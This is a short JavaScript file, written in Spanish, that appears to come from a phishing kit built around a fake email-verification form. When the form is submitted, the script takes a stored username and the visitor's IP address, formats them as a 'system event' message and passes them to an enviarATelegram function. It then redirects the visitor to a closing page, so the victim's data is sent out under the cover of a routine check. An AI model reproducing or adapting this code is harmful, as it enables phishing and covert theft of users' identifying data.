document.addEventListener('DOMContentLoaded', () => {
    const correoForm = document.getElementById('correoForm');
    const continueButton = document.querySelector('.btn-continue');

    const REDIRECCION_URL = 'fin.html';

    correoForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const usuario = localStorage.getItem('usuario_guardado') || 'No detectado';

        const ipUsuario = await obtenerIP();
        const fechaHora = obtenerFechaHora();

        const mensaje = `📢 <b>Evento del Sistema - Verificación de Correo</b>\n\n` +
                        `ℹ️ <b>Estado:</b> El usuario ha interactuado con el enlace de verificación en su correo.\n` +
                        `👤 <b>Usuario Asociado:</b> ${usuario}\n` +
                        `🌐 <b>Dirección IP:</b> ${ipUsuario}\n` +
                        `⏰ <b>Fecha y Hora:</b> ${fechaHora}\n`;

        continueButton.disabled = true;
        continueButton.innerText = 'Procesando...';

        await enviarATelegram(mensaje);
        window.location.href = REDIRECCION_URL;
    });
});
